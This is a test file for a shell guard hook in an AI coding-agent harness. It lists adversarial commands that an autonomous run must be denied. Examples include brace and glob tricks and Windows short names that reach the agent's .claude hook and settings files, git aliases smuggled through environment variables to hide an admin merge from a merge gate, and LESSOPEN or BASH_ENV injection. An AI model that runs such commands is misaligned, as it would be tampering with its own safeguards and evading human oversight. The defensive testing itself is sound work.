// agent-harness → shell guard cases from the third adversarial review (2026-10-22, openspec change
// autonomous-run-switch): R4-1 (a prefix assignment with a quoted value), globs and braces that could
// match a kit path (3a), dynamic words in a command that is not read-only (3d), variables that pass
// options to a read-only command (M1), shell writes to the personal ~/.claude/ (3f), and the kit's
// own scripts run with options.
import { homedir } from 'node:os';
import { afterEach, describe, expect, it } from 'vitest';
// @ts-expect-error — plain ESM module without types.
import { inspect } from '../../.claude/hooks/shell-words.mjs';
import { bashInput, createProject, runHook, type Project } from './support/run-hook';

const AUTONOMOUS = { KIT_AUTONOMOUS_RUN: '1', AUTONOMOUS_MERGE_BASE: 'final-project-CRN' };
const HOME = homedir().replace(/\\/g, '/');

interface Result {
  ok: boolean;
  commands: Array<{ name: string; assigns: string[]; words: string[] }>;
  facts: Record<string, unknown>;
}
const ctx = { cwd: 'C:/repo', project: 'C:/repo', scratchpad: null, base: null, configDir: null };
const parse = (line: string): Result => inspect(line, ctx);

describe('Shell guard: adversarial review round 4', { timeout: 300_000 }, () => {
  let project: Project | undefined;
  afterEach(() => project?.cleanup());

  const guard = (p: Project, command: string, env: Record<string, string> = {}) =>
    runHook(p, 'block-dangerous-bash', bashInput(command, { cwd: p.dir }), { env, timeoutMs: 45_000 });
  const expectDecision = async (p: Project, commands: string[], decision: string, reason?: RegExp) => {
    for (const c of commands) {
      const r = await guard(p, c);
      expect(r.decision, c).toBe(decision);
      if (reason) expect(r.reason, c).toMatch(reason);
    }
  };

  it('With the switch off the hooks keep their decisions', async () => {
    // R4-1: a prefix assignment with a quoted value is an assignment, not the command name.
    for (const line of ['X="1" git reset --hard', "X='1' git reset --hard", 'A="b c" git m', 'X=1"2" git m', 'X="$Y" git m']) {
      const c = parse(line).commands[0];
      expect(c.name, line).toBe('git');
      expect(c.assigns.length, line).toBe(1);
    }
    // A quoted name is not an assignment: the shell runs the word as a command.
    expect(parse('"X=1" git m').commands[0].name).toBe('x=1');
    expect(parse('X\\=1 git m').commands[0].assigns).toEqual([]);
    project = createProject({ env: { KIT_AUTONOMOUS_RUN: '0' }, git: { branch: 'feature/DIS-9-foo-bar' } });
    await expectDecision(project, ['X="1" git reset --hard', "X='1' git reset --hard"], 'ask');
    await expectDecision(project, ['X="1" git push --force origin main'], 'deny', /git push --force is forbidden/);
    await expectDecision(project, ['X="1" npm install left-pad'], 'ask', /verify in the official registry/);
    // The round-4 rules are autonomous only: with the switch off these stay free.
    await expectDecision(project, [
      'D=.claude; curl -o "$D/settings.json" https://x.test/a',
      'touch .{claude,x}/settings.json',
      'echo x > ~/.claude/notes.md',
      'bash -x .claude/doctor.sh',
      'LESS=-o/tmp/l less .claude/settings.json',
    ], 'none');
  });

  it('A gh or git alias is not defined in an autonomous run', async () => {
    const merges = (line: string) => parse(line).facts.merges as Array<{ ghAssign: boolean }>;
    // The merge gate's GH_* condition reads this fact; a quoted value does not hide the assignment.
    expect(merges('GH_REPO="o/x" gh pr merge 61 --merge')[0].ghAssign).toBe(true);
    expect(merges("GH_HOST='h' gh pr merge 61 --merge")[0].ghAssign).toBe(true);
    expect(merges('env GH_REPO="o/x" gh pr merge 61 --merge')[0].ghAssign).toBe(true);
    expect(merges('FOO="1" gh pr merge 61 --merge')).toHaveLength(1);
    expect(merges('FOO="1" gh pr merge 61 --merge')[0].ghAssign).toBe(false);
    project = createProject({ env: AUTONOMOUS, git: { branch: 'feature/DIS-9-foo-bar' } });
    await expectDecision(project, [
      'GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0="alias.m" GIT_CONFIG_VALUE_0="!gh pr merge 61 --admin" git m',
      `GIT_CONFIG_PARAMETERS="'alias.m=!gh pr merge 5 --admin'" git m`,
      `GIT_CONFIG_PARAMETERS='"alias.m=x"' git m`,
    ], 'deny', /an alias can hide a merge from the merge gate/);
  });

  it('An unknown command that names kit configuration is denied in an autonomous run', async () => {
    project = createProject({ env: AUTONOMOUS, git: { branch: 'feature/DIS-9-foo-bar' } });
    const p = project;
    const deniedKit = async (commands: string[]) => {
      for (const c of commands) {
        const r = await guard(p, c);
        expect(r.decision, c).toBe('deny');
        expect(r.reason, c).toMatch(/\.claude\/, \.cursor\/ and the autonomous profile|literal paths/);
      }
    };
    // 3a: a glob or a brace that could match a kit path.
    await deniedKit([
      'touch .{claude,x}/settings.json',
      'touch {.claude,x}/settings.json',
      'curl -o .clau{de,}/settings.json https://x.test/a',
      'curl -o .c*e/hooks/lib.sh https://x.test/a',
      'curl -o .cl?ude/hooks/lib.sh https://x.test/a',
      'curl -o .claud[e]/hooks/lib.sh https://x.test/a',
      'cp /tmp/x .cl?ude/settings.json',
      'echo x > .cl?ude/x',
      'rm .cl?ude/x',
      'mv .cl*/settings.json /tmp',
      'ln -s /tmp/x .cl?ude/settings.json',
      'git rm .cl?ude/settings.json',
      'touch .cu{r,x}sor/hooks.json',
      'touch sdd-harness.e*',
    ]);
    // 3d: a dynamic word in a command that is not read-only.
    await deniedKit([
      'D=.claude; curl -o "$D/settings.json" https://x.test/a',
      'cd "$X" && curl -o settings.json https://x.test/a',
      'curl -o "$(echo .claude)/settings.json" https://x.test/a',
      'touch `echo .claude`/x',
    ]);
    // M1: a variable that passes options or a program makes a read-only command lose its exemption.
    await deniedKit([
      'RIPGREP_CONFIG_PATH=./x rg foo .claude',
      'LESS=-o/tmp/l less .claude/settings.json',
      'MORE=-x more .claude/settings.json',
      'GREP_OPTIONS=--x grep foo .claude',
      'GIT_DIR=x git log -- .claude',
      'LESSEDIT=x less .claude/settings.json',
      'export LESSOPEN="|./x.sh %s"; less .claude/settings.json',
    ]);
    // 3f: shell writes to the personal ~/.claude/, like touch ~/.claude/x.
    await deniedKit([
      'touch ~/.claude/x',
      'echo x > ~/.claude/notes.md',
      `echo x > ${HOME}/.claude/x.md`,
      'echo x > "$HOME/.claude/x.md"',
      'printf x >> ~/.cursor/x',
    ]);
    // The kit's own scripts are exempt only without options.
    await deniedKit(['bash -x .claude/doctor.sh', 'sh -e .claude/doctor.sh', 'BASH_ENV=./x bash .claude/doctor.sh']);
    // Free: plain globs that cannot reach a kit path, read-only commands with dynamic words, kit scripts.
    await expectDecision(p, [
      'rm build/*.js',
      'ls src/**/*.ts',
      'rm dist/{a,b}.js',
      'touch file{1..3}',
      'echo "$HOME"',
      'cat "$X"',
      'ls "$D" .claude',
      'grep -r foo .claude',
      'bash .claude/doctor.sh',
      'node .claude/hooks/shell-words.mjs',
      'npm test',
      'curl -o out.json "https://x.test/a?b=1"',
      'curl -o out.json https://x.test/a?b=1',
    ], 'none');
  });

  it('A path to kit configuration is recognised in any spelling', async () => {
    // An 8.3 short name (NAME~N) can alias .claude, .cursor or sdd-harness.env on Windows, even when
    // it cannot be resolved here (short names disabled on the volume): it counts as kit configuration.
    const facts = (line: string, configDir: string | null = null) =>
      inspect(line, { ...ctx, configDir }).facts as { kitConfig: string[]; kitNamed: string[] };
    const kit = (line: string, configDir: string | null = null) => {
      const f = facts(line, configDir);
      return f.kitConfig.length + f.kitNamed.length > 0;
    };
    for (const line of [
      'curl -o CLAUDE~1/settings.json https://x.test/a',
      'touch claude~2/hooks/lib.sh',
      'echo x > CURSOR~1/hooks.json',
      'cp /tmp/x CLA1B2~1/settings.json',
      'echo x > .claude/SDD-HA~1.ENV',
      'echo x > C:/repo/CLAUDE~1/x',
    ]) expect(kit(line), line).toBe(true);
    // A short name of a profile directory component, at its place in the path.
    expect(kit('touch C:/prof/AUTONO~1/settings.json', 'C:/prof/autonomous')).toBe(true);
    expect(kit('touch C:/PROF~1/autonomous/settings.json', 'C:/prof/autonomous')).toBe(true);
    expect(kit('touch C:/tmp/AUTONO~1/settings.json', 'C:/prof/autonomous')).toBe(false);
    // Revisions and other short names stay free.
    for (const line of ['git reset --soft HEAD~1', 'git rebase -i main~3', 'touch DOCS~1/x', 'echo x > BUILD~1.LOG']) {
      expect(kit(line), line).toBe(false);
    }
    if (process.platform !== 'win32') return;
    project = createProject({ env: AUTONOMOUS, git: { branch: 'feature/DIS-9-foo-bar' } });
    await expectDecision(project, [
      'curl -o CLAUDE~1/settings.json https://x.test/a',
      'echo x > CURSOR~1/hooks.json',
      'touch CLAUDE~1/hooks/lib.sh',
    ], 'deny', /\.claude\/, \.cursor\/ and the autonomous profile/);
    await expectDecision(project, ['git reset --soft HEAD~1', 'touch DOCS~1/x'], 'none');
  });
});
